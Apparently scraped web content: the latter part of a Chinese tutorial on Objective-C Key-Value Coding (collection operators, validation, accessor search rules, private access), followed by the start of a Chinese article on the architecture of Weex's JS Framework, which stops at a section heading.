<pre><code class=""objc"">NSDate *latestDate = [self.transactions valueForKeyPath:@""@max.date""];</code></pre>
<ul><li>
<code>@min</code>用来查找集合中<code>right keyPath</code>指定的属性的最小值。</li></ul>
<pre><code class=""objc"">NSDate *earliestDate = [self.transactions valueForKeyPath:@""@min.date""];</code></pre>
<p>备注：<code>@max</code>和<code>@min</code>在进行判断时，都是通过调用<code>compare:</code>方法进行判断，所以可以通过重写该方法对判断过程进行控制。</p>
<h4>数组操作符</h4>
<ul><li>
<code>@unionOfObjects</code>将集合对象中，所有<code>payee</code>对象放在一个数组中并返回。</li></ul>
<pre><code class=""objc"">NSArray *payees = [self.transactions valueForKeyPath:@""@unionOfObjects.payee""];</code></pre>
<ul><li>
<code>@distinctUnionOfObjects</code>将集合对象中，所有<code>payee</code>对象放在一个数组中，并将数组进行去重后返回。</li></ul>
<pre><code class=""objc"">NSArray *distinctPayees = [self.transactions valueForKeyPath:@""@distinctUnionOfObjects.payee""];</code></pre>
<p>注意：以上两个方法中，如果操作的属性为<code>nil</code>，在添加到数组中时会导致<code>Crash</code>。</p>
<h4>嵌套操作符</h4>
<p>由于嵌套操作符是需要对嵌套的集合对象进行操作，所以新建一个<code>arrayOfArrays</code>对象，其中包含两个数组，数组中存储的都是<code>Transaction</code>类型对象。</p>
<pre><code class=""objc"">NSArray *moreTransactions = ....;
NSArray *arrayOfArrays = @[self.transactions, moreTransactions];</code></pre>
<ul><li>
<code>@unionOfArrays</code>是用来操作集合内部的集合对象，将所有<code>right keyPath</code>对应的对象放在一个数组中返回。</li></ul>
<pre><code class=""objc"">NSArray *collectedPayees = [arrayOfArrays valueForKeyPath:@""@unionOfArrays.payee""];</code></pre>
<ul><li>
<code>@distinctUnionOfArrays</code>是用来操作集合内部的集合对象，将所有<code>right keyPath</code>对应的对象放在一个数组中，并进行排重。</li></ul>
<pre><code class=""objc"">NSArray *collectedDistinctPayees = [arrayOfArrays valueForKeyPath:@""@distinctUnionOfArrays.payee""];</code></pre>
<ul><li>
<code>@distinctUnionOfSets</code>是用来操作集合内部的集合对象，将所有<code>right keyPath</code>对应的对象放在一个<code>set</code>中，并进行排重。</li></ul>
<pre><code class=""objc"">NSSet *collectedPayees = [arrayOfArrays valueForKeyPath:@""@distinctUnionOfSets.payee""];</code></pre>
<h4>小技巧</h4>
<p>如果在集合对象中操作的属性，本来就是<code>NSNumber</code>类型，则可以像下面这样，直接用<code>self</code>代表值自身。</p>
<pre><code class=""objc"">NSArray *array = @[@(productA.price), @(productB.price), @(productC.price), @(productD.price)];
NSNumber *avg = [array valueForKeyPath:@""@avg.self""];</code></pre>
<h3>非对象值处理</h3>
<p><strong><code>KVC</code>是支持基础数据类型和结构体的</strong>，可以在<code>setter</code>和<code>getter</code>的时候，通过<code>NSValue</code>和<code>NSNumber</code>来转换为<code>OC</code>对象。<code>Swift</code>中不存在这样的需求，因为<code>Swift</code>中所有变量都是对象。</p>
<p>以下是结构体转换的示例代码，可以调用<code>initWithBool:</code>方法对基础数据类型进行包装，除了调用方法外还可以通过字面量实现，例如<code>@(YES)</code>的调用。通过<code>NSNumber</code>的<code>boolValue</code>属性转换为基础数据类型。</p>
<pre><code class=""objc"">@property (nonatomic, assign, readonly) BOOL boolValue;
- (NSNumber *)initWithBool:(BOOL)value NS_DESIGNATED_INITIALIZER;</code></pre>
<p>结构体转换的代码定义在<code>UIGeometry.h</code>中，以<code>NSValue</code>的<code>Category</code>形式存在。<code>NSValue</code>对<code>CGPoint</code>、<code>CGRect</code>等结构体都提供了转换方法，例如下面是对<code>CGPoint</code>进行转换的示例代码。</p>
<pre><code class=""objc"">@property(nonatomic, assign, readonly) CGPoint CGPointValue;
+ (NSValue *)valueWithCGPoint:(CGPoint)point;</code></pre>
<p>需要注意的是，无论什么时候都不应该给<code>setter</code>中传入<code>nil</code>，会导致<code>Crash</code>并引起<code>NSInvalidArgumentException</code>异常。</p>
<h3>属性验证</h3>
<p>在调用<code>KVC</code>时可以先进行验证，验证通过下面两个方法进行，支持<code>key</code>和<code>keyPath</code>两种方式。验证方法默认实现返回<code>YES</code>，可以通过重写对应的方法修改验证逻辑。</p>
<p>验证方法需要我们手动调用，并不会在进行<code>KVC</code>的过程中自动调用。</p>
<pre><code class=""objc"">- (BOOL)validateValue:(inout id _Nullable * _Nonnull)ioValue forKey:(NSString *)inKey error:(out NSError **)outError;
- (BOOL)validateValue:(inout id _Nullable * _Nonnull)ioValue forKeyPath:(NSString *)inKeyPath error:(out NSError **)outError;</code></pre>
<p>下面是使用验证方法的例子。在<code>validateValue</code>方法的内部实现中，如果传入的<code>value</code>或<code>key</code>有问题，可以通过返回<code>NO</code>来表示错误，并设置<code>NSError</code>对象。</p>
<pre><code class=""objc"">Person *person = [[Person alloc] init];
NSError *error;
NSString *name = @""John"";
if (![person validateValue:&amp;name forKey:@""name"" error:&amp;error]) {
    NSLog(@""%@"", error);
}</code></pre>
<h4>单独验证</h4>
<p><code>KVC</code>还支持对单独属性做验证，可以通过定义<code>validate&lt;Key&gt;:error:</code>格式的方法，并在方法内部实现验证代码。在编写<code>KVC</code>验证代码的时候，应该先查找属性有没有自定义<code>validate</code>方法，然后再查找<code>validateValue:</code>方法，如果有则调用自己实现的方法，如果两个方法都没有实现则默认返回<code>YES</code>。</p>
<pre><code class=""objc"">- (BOOL)validateName:(id *)ioValue error:(NSError * __autoreleasing *)outError{
    if ((*ioValue == nil) || ([(NSString *)*ioValue length] &lt; 2)) {
        if (outError != NULL) {
            *outError = [NSError errorWithDomain:PersonErrorDomain
                                            code:PersonInvalidNameCode
                                        userInfo:@{ NSLocalizedDescriptionKey
                                                    : @""Name too short"" }];
        }
        return NO;
    }
    return YES;
}</code></pre>
<p>我觉得<code>KVC</code>应该支持<code>validateValue</code>自动验证，在调用<code>setValue</code>或<code>getValue</code>时自动进行验证，如果不符合验证规则，就调用失败。如果外界使用的地方都先调用一次<code>validateValue</code>的话，这是很麻烦的。当然也有解决方法，可以通过<code>Method Swizzling</code>方法<code>hook</code>住<code>setValue</code>和<code>getValue</code>方法。</p>
<h3>搜索规则</h3>
<p><strong><code>KVC</code>在通过<code>key</code>或者<code>keyPath</code>进行操作的时候，可以查找属性方法、成员变量等，查找的时候可以兼容多种命名。</strong>具体的查找规则要以官方文档为主，所以我把官方文档翻译了一下写在下面。</p>
<p><strong>在<code>KVC</code>的实现中，依赖<code>setter</code>和<code>getter</code>的方法实现，所以方法命名应该符合苹果要求的规范，否则会导致<code>KVC</code>失败。</strong></p>
<p>在学习<code>KVC</code>的搜索规则前，要先弄明白一个属性的作用，这个属性在搜索过程中起到很重要的作用。这个属性表示是否允许读取实例变量的值，如果为<code>YES</code>则在<code>KVC</code>查找的过程中，从内存中读取属性实例变量的值。</p>
<pre><code class=""objc"">@property (class, readonly) BOOL accessInstanceVariablesDirectly;</code></pre>
<h4>基础Getter搜索模式</h4>
<p>这是<code>valueForKey:</code>的默认实现，给定一个<code>key</code>当做输入参数，开始下面的步骤，在这个接收<code>valueForKey:</code>方法调用的类内部进行操作。</p>
<ol>
<li>通过<code>getter</code>方法搜索实例，例如<code>get&lt;Key&gt;</code>, <code>&lt;key&gt;</code>, <code>is&lt;Key&gt;</code>, <code>_&lt;key&gt;</code>的拼接方案。按照这个顺序，如果发现符合的方法，就调用对应的方法并拿着结果跳转到第五步。否则，就继续到下一步。</li>
<li>如果没有找到简单的<code>getter</code>方法，则搜索其匹配模式的方法<code>countOf&lt;Key&gt;</code>、<code>objectIn&lt;Key&gt;AtIndex:</code>、<code>&lt;key&gt;AtIndexes:</code>。<p>如果找到其中的第一个和其他两个中的一个，则创建一个集合代理对象，该对象响应所有<code>NSArray</code>的方法并返回该对象。否则，继续到第三步。</p>
<p>代理对象随后将<code>NSArray</code>接收到的<code>countOf&lt;Key&gt;</code>、<code>objectIn&lt;Key&gt;AtIndex:</code>、<code>&lt;key&gt;AtIndexes:</code>的消息给符合<code>KVC</code>规则的调用方。</p>
<p>当代理对象和<code>KVC</code>调用方通过上面方法一起工作时，就会允许其行为类似于<code>NSArray</code>一样。</p>
</li>
<li>如果没有找到<code>NSArray</code>简单存取方法，或者<code>NSArray</code>存取方法组。则查找有没有<code>countOf&lt;Key&gt;</code>、<code>enumeratorOf&lt;Key&gt;</code>、<code>memberOf&lt;Key&gt;:</code>命名的方法。<p>如果找到三个方法，则创建一个集合代理对象，该对象响应所有<code>NSSet</code>方法并返回。否则，继续执行第四步。</p>
<p>此代理对象随后转换<code>countOf&lt;Key&gt;</code>、<code>enumeratorOf&lt;Key&gt;</code>、<code>memberOf&lt;Key&gt;:</code>方法调用到创建它的对象上。实际上，这个代理对象和<code>NSSet</code>一起工作，使得其表象上看起来是<code>NSSet</code>。</p>
</li>
<li>如果没有发现简单<code>getter</code>方法，或集合存取方法组，以及接收类方法<code>accessInstanceVariablesDirectly</code>是返回<code>YES</code>的。搜索一个名为<code>_&lt;key&gt;</code>、<code>_is&lt;Key&gt;</code>、<code>&lt;key&gt;</code>、<code>is&lt;Key&gt;</code>的实例，根据他们的顺序。<p>如果发现对应的实例，则立刻获得实例可用的值并跳转到第五步，否则，跳转到第六步。</p>
</li>
<li>如果取回的是一个对象指针，则直接返回这个结果。<br>如果取回的是一个基础数据类型，但是这个基础数据类型是被<code>NSNumber</code>支持的，则存储为<code>NSNumber</code>并返回。<br>如果取回的是一个不支持<code>NSNumber</code>的基础数据类型，则通过<code>NSValue</code>进行存储并返回。</li>
<li>如果所有情况都失败，则调用<code>valueForUndefinedKey:</code>方法并抛出异常，这是默认行为。但是子类可以重写此方法。</li>
</ol>
<h4>基础Setter搜索模式</h4>
<p>这是<code>setValue:forKey:</code>的默认实现，给定输入参数<code>value</code>和<code>key</code>。试图在接收调用对象的内部，设置属性名为<code>key</code>的<code>value</code>，通过下面的步骤：</p>
<ol>
<li>查找<code>set&lt;Key&gt;:</code>或<code>_set&lt;Key&gt;</code>命名的<code>setter</code>，按照这个顺序，如果找到的话，调用这个方法并将值传进去(根据需要进行对象转换)。</li>
<li>如果没有发现一个简单的<code>setter</code>，但是<code>accessInstanceVariablesDirectly</code>类属性返回<code>YES</code>，则查找一个命名规则为<code>_&lt;key&gt;</code>、<code>_is&lt;Key&gt;</code>、<code>&lt;key&gt;</code>、<code>is&lt;Key&gt;</code>的实例变量。根据这个顺序，如果发现则将<code>value</code>赋值给实例变量。</li>
<li>如果没有发现<code>setter</code>或实例变量，则调用<code>setValue:forUndefinedKey:</code>方法，并默认提出一个异常，但是一个<code>NSObject</code>的子类可以提出合适的行为。</li>
</ol>
<h4>NSMutableArray搜索模式</h4>
<p>这是<code>mutableArrayValueForKey:</code>的默认实现，给一个<code>key</code>当做输入参数。在接收访问器调用的对象中，返回一个名为<code>key</code>的可变代理数组，这个代理数组就是用来响应外界<code>KVO</code>的对象，通过下面的步骤进行查找：</p>
<ol>
<li>查找一对方法<code>insertObject:in&lt;Key&gt;AtIndex:</code>和<code>removeObjectFrom&lt;Key&gt;AtIndex:</code>(相当于<code>NSMutableArray</code>的原始方法<code>insertObject:atIndex:</code>和<code>removeObjectAtIndex:</code>)或者方法名是<code>insert&lt;Key&gt;:atIndexes:</code>和<code>remove&lt;Key&gt;AtIndexes:</code>(相当于<code>NSMutableArray</code>的原始方法<code>insertObjects:atIndexes:</code>和<code>removeObjectsAtIndexes:</code>)。<p>如果找到最少一个<code>insert</code>方法和最少一个<code>remove</code>方法，则返回一个代理对象，来响应发送给<code>NSMutableArray</code>的组合消息<code>insertObject:in&lt;Key&gt;AtIndex:</code>、<code>removeObjectFrom&lt;Key&gt;AtIndex:</code>、<code>insert&lt;Key&gt;:atIndexes:</code>，和<code>remove&lt;Key&gt;AtIndexes:</code>消息。</p>
<p>当对象接收一个<code>mutableArrayValueForKey:</code>消息并实现可选替换方法，例如<code>replaceObjectIn&lt;Key&gt;AtIndex:withObject:</code>或<code>replace&lt;Key&gt;AtIndexes:with&lt;Key&gt;:</code>方法，代理对象会在适当的情况下使用它们，以获得最佳性能。</p>
</li>
<li>如果对象没有可变数组方法，查找一个替代方法，命名格式为<code>set&lt;Key&gt;:</code>。在这种情况下，向<code>mutableArrayValueForKey:</code>的原始响应者发送一个<code>set&lt;Key&gt;:</code>消息，来返回一个代理对象来响应<code>NSMutableArray</code>事件。<p>提示：<br>这一步描述的机制远不如上一步有效，因为它可能重复创建新的集合对象，而不是修改现有的对象。因此，在自己设计的<code>KVC</code>时应该尽量避免它。</p>
</li>
<li>如果没有可变数组的方法，也没有找到访问器，但接受响应的类<code>accessInstanceVariablesDirectly</code>属性返回<code>YES</code>，则查找一个名为<code>_&lt;key&gt;</code>或<code>&lt;key&gt;</code>的实例变量。<p>按照这个顺序，如果找到实例变量，则返回一个代理对象。改对象将接收所有<code>NSMutableArray</code>发送过来的消息，通常是<code>NSMutableArray</code>或其子类。</p>
</li>
<li>如果所有情况都失败，则返回一个可变的集合代理对象。当它接收<code>NSMutableArray</code>消息时，发送一个<code>setValue:forUndefinedKey:</code>消息给接收<code>mutableArrayValueForKey:</code>消息的原始对象。<p>这个<code>setValue:forUndefinedKey:</code>的默认实现是提出一个<code>NSUndefinedKeyException</code>异常，但是子类可以重写这个实现。</p>
</li>
</ol>
<h4>其他搜索模式</h4>
<p>还有<code>NSMutableSet</code>和<code>NSMutableOrderedSet</code>两种搜索模式，这两种搜索模式和<code>NSMutableArray</code>步骤相同，只是搜索和调用的方法不同。详细的搜索方法都可以在<a href=""https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/KeyValueCoding/SearchImplementation.html#//apple_ref/doc/uid/20000955-CJBBBFFA"" rel=""nofollow noreferrer"">KVC官方文档</a>中找到，再套用上面的流程即可理解。</p>
<h4>代码示例</h4>
<p>根据上面<code>KVC</code>查找规则的描述，我们定义一个<code>TestObject</code>类，并指定其他<code>setter</code>和<code>getter</code>，以及合成为其他的成员变量，看<code>KVC</code>是否能够找到属性的对象并赋值。</p>
<pre><code class=""objc"">@interface TestObject : NSObject {
    NSObject *_newObject;
}
@property (nonatomic, strong, setter=newSetObject:, getter=newObject) NSObject *object;
@property (nonatomic, strong) NSObject *twoObject;
@end

@implementation TestObject
@synthesize object = _newObject;
@end</code></pre>
<p>这里对两个属性进行赋值，<code>twoObject</code>属性赋值没有任何问题，而第二个属性赋值则会导致<code>Crash</code>。崩溃信息如上面所述抛出一个<code>NSUnknownKeyException</code>异常，并提示没有找到<code>object</code>获取方法和实例对象。</p>
<pre><code class=""objc"">TestObject *object = [[TestObject alloc] init];
[object setValue:[NSObject new] forKey:NSStringFromSelector(@selector(twoObject))];
[object setValue:[NSObject new] forKey:NSStringFromSelector(@selector(object))];</code></pre>
<p>如果将<code>object</code>改为<code>newObject</code>则可以解决这个问题，以此验证上面的<code>KVC</code>查找规则。</p>
<h3>KVC性能</h3>
<p><strong>根据上面<code>KVC</code>的实现原理，我们可以看出<code>KVC</code>的性能并不如直接访问属性快，虽然这个性能消耗是微乎其微的。</strong>所以在使用<code>KVC</code>的时候，建议最好不要手动设置属性的<code>setter</code>、<code>getter</code>，这样会导致搜索步骤变长。</p>
<p>而且尽量不要用<code>KVC</code>进行集合操作，例如<code>NSArray</code>、<code>NSSet</code>之类的，集合操作的性能消耗更大，而且还会创建不必要的对象。</p>
<h3>私有访问</h3>
<p>根据上面的实现原理我们知道，<code>KVC</code>本质上是操作方法列表以及在内存中查找实例变量。我们可以利用这个特性访问类的私有变量，例如下面在<code>.m</code>中定义的私有成员变量和属性，都可以通过<code>KVC</code>的方式访问。</p>
<p>这个操作对<code>readonly</code>的属性，<code>@protected</code>的成员变量，都可以正常访问。如果不想让外界访问类的成员变量，则可以将<code>accessInstanceVariablesDirectly</code>属性赋值为<code>NO</code>。</p>
<pre><code class=""objc"">TestObject.m文件

@interface TestObject () {
    NSObject *_objectOne;
}
@property (nonatomic, strong) NSObject *objectTwo;
@end</code></pre>
<p><code>KVC</code>在实践中也有很多用处，例如<code>UITabbar</code>或<code>UIPageControl</code>这样的控件，系统已经为我们封装好了，但是对于一些样式的改变并没有提供足够的<code>API</code>，这种情况就需要我们用<code>KVC</code>进行操作了。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000013476171"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""新浪微博"" title=""新浪微博""></span></p>
<p>可以自定义一个<code>UITabbar</code>对象，然后在内部创建自己想要的视图，并通过<code>layoutSubviews</code>方法在内部进行重新布局。然后通过<code>KVC</code>的方式，将<code>UITabbarController</code>的<code>tabbar</code>属性替换为自定义的类即可。</p>
<h3>安全性检查</h3>
<p><code>KVC</code>存在一个问题在于，因为传入的<code>key</code>或<code>keyPath</code>是一个字符串，这样很容易写错或者属性自身修改后字符串忘记修改，这样会导致<code>Crash</code>。</p>
<p>可以利用<code>iOS</code>的反射机制来规避这个问题，通过<code>@selector()</code>获取到方法的<code>SEL</code>，然后通过<code>NSStringFromSelector()</code>将<code>SEL</code>反射为字符串。这样在<code>@selector()</code>中传入方法名的过程中，编译器会有合法性检查，如果方法不存在或未实现会报黄色警告。</p>
<pre><code class=""objc"">[self valueForKey:NSStringFromSelector(@selector(object))];</code></pre>

                ", KVC原理剖析,1531971893,182,1,623,1,1,https://segmentfault.com/a/1190000013476163
28,1,0,6,"
                    
<blockquote>很久以前，我写过两篇文章（《<a href=""https://yq.aliyun.com/articles/59934"" rel=""nofollow noreferrer"">Weex 框架中 JS Framework 的结构</a>》，《<a href=""https://yq.aliyun.com/articles/59935"" rel=""nofollow noreferrer"">详解 Weex JS Framework 的编译过程</a>》）介绍过 JS Framework。但是文章写于 2016 年 8 月份，这都是一年半以前的事了，说是“详解”其实解释得并不详细，而且是基于旧版 .we 框架写的，DSL 和底层框架各部分的功能解耦得的并不是很清楚。这一年多以来 JS Framework 已经有了很大的变化，不仅支持了 Vue 和 Rax，原生容器和底层接口也做了大量改造，这里再重新介绍一遍。</blockquote>
<h2>在 Weex 框架中的位置</h2>
<p>Weex 是一个既支持多个前端框架又能跨平台渲染的框架，JS Framework 介于前端框架和原生渲染引擎之间，处于承上启下的位置，也是跨框架跨平台的关键。无论你使用的是 Vue 还是 Rax，无论是渲染在 Android 还是 iOS，JS Framework 的代码都会运行到（如果是在浏览器和 WebView 里运行，则不依赖 JS Framework）。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4k1H?w=2444&amp;h=992"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""js framework position"" title=""js framework position""></span></p>
<p>像 Vue 和 Rax 这类前端框架虽然内部的渲染机制、Virtual DOM 的结构都是不同的，但是都是用来描述页面结构以及开发范式的，对 Weex 而言只属于语法层，或者称之为 DSL (Domain Specific Language)。无论前端框架里数据管理和组件管理的策略是什么样的，它们最终都将调用 JS Framework 提供的接口来调用原生功能并且渲染真实 UI。底层渲染引擎中也不必关心上层框架中组件化的语法和更新策略是怎样的，只需要处理 JS Framework 中统一定义的节点结构和渲染指令。多了这么一层抽象，有利于标准的统一，也使得跨框架和跨平台成为了可能。</p>
<blockquote>图虽然这么画，但是大部分人并不区分得这么细，喜欢把 Vue 和 Rax 以及下边这一层放一起称为 JS Framework。</blockquote>
<h2>主要功能</h2>
<p>如果将 JS Framework 的功能进一步拆解，可以分为如下几个部分：</p>
<ul>
<li>适配前端框架</li>
<li>构建渲染指令树</li>
<li>JS-Native 通信</li>
<li>JS Service</li>
<li>准备环境接口</li>
</ul>
<h3>适配前端框架</h3>
<p>前端框架在 Weex 和浏览器中的执行过程不一样，这个应该不难理解。如何让一个前端框架运行在 Weex 平台上，是 JS Framework 的一个关键功能。</p>
<p>以 Vue.js 为例，在浏览器上运行一个页面大概分这么几个步骤：首先要准备好页面容器，可以是浏览器或者是 WebView，容器里提供了标准的 Web API。然后给页面容器传入一个地址，通过这个地址最终获取到一个 HTML 文件，然后解析这个 HTML 文件，加载并执行其中的脚本。想要正确的渲染，应该首先加载执行 Vue.js 框架的代码，向浏览器环境中添加 <code>Vue</code> 这个变量，然后创建好挂载点的 DOM 元素，最后执行页面代码，从入口组件开始，层层渲染好再挂载到配置的挂载点上去。</p>
<p>在 Weex 里的执行过程也比较类似，不过 Weex 页面对应的是一个 js 文件，不是 HTML 文件，而且不需要自行引入 Vue.js 框架的代码，也不需要设置挂载点。过程大概是这样的：首先初始化好 Weex 容器，这个过程中会初始化 JS Framework，Vue.js 的代码也包含在了其中。然后给 Weex 容器传入页面地址，通过这个地址最终获取到一个 js 文件，客户端会调用 createInstance 来创建页面，也提供了刷新页面和销毁页面的接口。大致的渲染行为和浏览器一致，但是和浏览器的调用方式不一样，前端框架中至少要适配客户端打开页面、销毁页面（push、pop）的行为才可以在 Weex 中运行。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4k2h?w=2800&amp;h=1063"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""js framework apis"" title=""js framework apis""></span></p>
<p>在 JS Framework 里提供了如上图所示的接口来实现前端框架的对接。图左侧的四个接口与页面功能有关，分别用于获取页面节点、监听客户端的任务、注册组件、注册模块，目前这些功能都已经转移到 JS Framework 内部，在前端框架里都是可选的，有特殊处理逻辑时才需要实现。图右侧的四个接口与页面的生命周期有关，分别会在页面初始化、创建、刷新、销毁时调用，其中只有 <code>createInstance</code> 是必须提供的，其他也都是可选的（在新的 Sandbox 方案中，<code>createInstance</code> 已经改成了 <code>createInstanceContext</code>）。详细的初始化和渲染过程会在后续章节里展开。</p>
<h3>构建渲染指令树</h3>
<p>不同的前端框架里 Virtual DOM 的结构、patch 的方式都是不同的，这也反应了它们开发理念和优化策略的不同，但是最终，在浏览器上它们都使用一致的 DOM API 把 Virtual DOM 转换成真实的 HTMLElement。在 Weex 里的逻辑也是类似的，只是在最后一步生成真实元素的过程中，不使用原生 DOM API，而是使用 JS Framework 里定义的一套 Weex DOM API 将操作转化成渲染指令发给客户端。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4k2Y?w=2658&amp;h=1098"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""patch virtual dom"" title=""patch virtual dom""></span></p>
<p>JS Framework 提供的 Weex DOM API 和浏览器提供的 DOM API 功能基本一致，在 Vue 和 Rax 内部对这些接口都做了适配，针对 Weex 和浏览器平台调用不同的接口就可以实现跨平台渲染。</p>
<p>此外 DOM 接口的设计相当复杂，背负了大量的历史包袱，也不是所有特性都适合移动端。JS Framework 里将这些接口做了大量简化，借鉴了 W3C 的标准，只保留了其中最常用到的一部分。目前的状态是够用、精简高效、和 W3C 标准有很多差异，但是已经成为 Vue 和 Rax 渲染原生 UI 的事实标准，后续还会重新设计这些接口，使其变得更标准一些。JS Framework 里 DOM 结构的关系如下图所示：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4k3u?w=1842&amp;h=1063"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Weex DOM"" title=""Weex DOM""></span></p>
<p>前端框架调用这些接口会在 JS Framework 中构建一颗树，这颗树中的节点不包含复杂的状态和绑定信息，能够序列化转换成 JSON 格式的渲染指令发送给客户端。这棵树曾经有过很多名字：Virtual DOM Tree、Native DOM Tree，我觉的其实它应该算是一颗 “Render Directive Tree”，也就是渲染指令树。叫什么无所谓了，反正它就是 JS Framework 内部的一颗与 DOM 很像的树。</p>
<p>这颗树的层次结构和原生 UI 的层次结构是一致的，当前端的节点有更新时，这棵树也会跟着更新，然后把更新结果以渲染指令的形式发送给客户端。这棵树并不计算布局，也没有什么副作用，操作也都是很高效的，基本都是 O(1) 级别，偶尔有些 O(n) 的操作会遍历同层兄弟节点或者上溯找到根节点，不会遍历整棵树。</p>
<h3>JS-Native 通信</h3>
<p>在开发页面过程中，除了节点的渲染以外，还有原生模块的调用、事件绑定、回调等功能，这些功能都依赖于 js 和 native 之间的通信来实现。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4k3W?w=2357&amp;h=1382"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""js-native communication"" title=""js-native communication""></span></p>
<p>首先，页面的 js 代码是运行在 js 线程上的，然而原生组件的绘制、事件的捕获都发生在 UI 线程。在这两个线程之间的通信用的是 <code>callNative</code> 和 <code>callJS</code> 这两个底层接口（现在已经扩展到了很多个），它们默认都是异步的，在 JS Framework 和原生渲染器内部都基于这两个方法做了各种封装。</p>
<p><code>callNative</code> 是由客户端向 JS 执行环境中注入的接口，提供给 JS Framework 调用，界面的节点（上文提到的渲染指令树）、模块调用的方法和参数都是通过这个接口发送给客户端的。为了减少调用接口时的开销，其实现在已经开了更多更直接的通信接口，其中有些接口还支持同步调用（支持返回值），它们在原理上都和 <code>callNative</code> 是一样的。</p>
<p><code>callJS</code> 是由 JS Framework 实现的，并且也注入到了执行环境中，提供给客户端调用。事件的派发、模块的回调函数都是通过这个接口通知到 JS Framework，然后再将其传递给上层前端框架。</p>
<h3>JS Service</h3>
<p>Weex 是一个多页面的框架，每个页面的 js bundle 都在一个独立的环境里运行，不同的 Weex 页面对应到浏览器上就相当于不同的“标签页”，普通的 js 库没办法实现在多个页面之间实现状态共享，也很难实现跨页通信。</p>
<p>在 JS Framework 中实现了 <a href=""http://weex-project.io/cn/references/js-service.html"" rel=""nofollow noreferrer"">JS Service</a> 的功能，主要就是用来解决跨页面复用和状态共享的问题的，例如 <a href=""http://weex-project.io/cn/references/broadcast-channel.html"" rel=""nofollow noreferrer"">BroadcastChannel</a> 就是基于 JS Service 实现的，它可以在多个 Weex 页面之间通信。</p>
<h3>准备环境接口</h3>
<p>由于 Weex 运行环境和浏览器环境有很大差异，在 JS Framework 里还对一些环境变量做了封装，主要是为了解决解决原生环境里的兼容问题，底层使用渲染引擎提供的接口。主要的改动点是：</p>
<ul>
<li>console: 原生提供了 <code>nativeLog</code> 接口，将其封装成前端熟悉的 <code>console.xxx</code> 并可以控制日志的输出级别。</li>
<li>timer: 原生环境里 timer 接口不全，名称和参数不一致。目前来看有了原生 C/C++ 实现的 timer 后，这一层可以移除。</li>
<li>freeze: 冻结当前环境里全局变量的原型链（如 Array.prototype）。</li>
</ul>
<p>另外还有一些 ployfill：<code>Promise</code> 、<code>Arary.from</code> 、<code>Object.assign</code> 、<code>Object.setPrototypeOf</code> 等。</p>
<p>这一层里的东西可以说都是用来“填坑”的，也是与环境有关 Bug 的高发地带，如果你只看代码的话会觉得莫名奇妙，但是它很可能解决了某些版本某个环境中的某个神奇的问题，也有可能触发了一个更神奇的问题。随着对 JS 引擎本身的优化和定制越来越多，这一层代码可以越来越少，最终会全部移除掉。</p>
<h2>执行过程</h2>
<p>上面是用空间角度介绍了 JS Framework 里包含了哪些部分，接下来从时间角度介绍一下某些功能在 JS Framework 里的处理流程。</p>
<h3>框架初始化</h3>
<p>JS Framework 以及 Vue 和 Rax 的代码都是内置在了 Weex SDK 里的，随着 Weex SDK 一起初始化。SDK 的初始化一般在 App 启动时就已经完成了，只会执行一次。初始化过程中与 JS Framework 有关的是如下这三个操作：</p>
<ol>
<li>
<strong>初始化 JS 引擎</strong>，准备好 JS 执行环境，向其中注册一些变量和接口，如 <code>WXEnvironment</code>、<code>callNative</code>。</li>
<li>
<strong>执行 JS Framework 的代码</strong>。</li>
<li>
<strong>注册原生组件和原生模块</strong>。</li>
</ol>
<p>针对第二步，执行 JS Framework 的代码的过程又可以分成如下几个步骤：</p>
<ol>
<li>
<strong>注册上层 DSL 框架</strong>，如 Vue 和 Rax。这个过程只是告诉 JS Framework 有哪些 DSL 可用，适配它们提供的接口，如 <code>init</code>、<code>createInstance</code>，但是不会执行前端框架里的逻辑。</li>
<li>
<strong>初始化环境变量</strong>，并且会将原生对象的原型链冻结，此时也会注册内置的 JS Service，如 <code>BroadcastChannel</code>。</li>
<li>如果 DSL 框架里实现了 <code>init</code> 接口，会在此时调用。</li>
<li>
<strong>向全局环境中注入可供客户端调用的接口</strong>，如 <code>callJS</code>、<code>createInstance</code>、<code>registerComponents</code>，调用这些接口会同时触发 DSL 中相应的接口。</li>
</ol>
<p>再回顾看这两个过程，可以发现原生的组件和模块是注册进来的，DSL 也是注册进来的，Weex 做的比较灵活，组件模块是可插拔的，DSL 框架也是可插拔的，有很强的扩展能力。</p>
<h3>JS Bundle 的执行过程</h3>
<p>在初始化好 Weex SDK 之后，就可以开始渲染页面了。通常 Weex 的一个页面对应了一个 js bundle 文件，页面的渲染过程也是加载并执行 js bundle 的过程，大概的步骤如下图所示：</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4k4Y?w=2728&amp;h=1461"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""execute js bundle"" title=""execute js bundle""></span></p>
<p>首先是调用原生渲染引擎里提供的接口来加载执行 js bundle，在 Android 上是 <code>renderByUrl</code>，在 iOS 上是 <code>renderWithURL</code>。在得到了 js bundle 的代码之后，会继续执行 SDK 里的原生 <code>createInstance</code> 方法，给当前页面生成一个唯一 id，并且把代码和一些配置项传递给 JS Framework 提供的 <code>createInstance</code> 方法。</p>
<p>在 JS Framework 接收到页面代码之后，会判断其中使用的 DSL 的类型（Vue 或者 Rax），然后找到相应的框架，执行 <code>createInstanceContext</code> 创建页面所需要的环境变量。</p>
<p><span class=""img-wrap""><img data-src=""/img/bV4k5r?w=1878&amp;h=1028"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""create instance"" title=""create instance""></span></p>
<p>在旧的方案中，JS Framework 会调用 <code>runInContex</code> 函数在特定的环境中执行 js 代码，内部基于 <code>new Function</code> 实现。<strong>在新的 Sandbox 方案中，js bundle 的代码不再发给 JS Framework，也不再使用 <code>new Function</code>，而是由客户端直接执行 js 代码。</strong></p>
<h3>页面的渲染</h3>
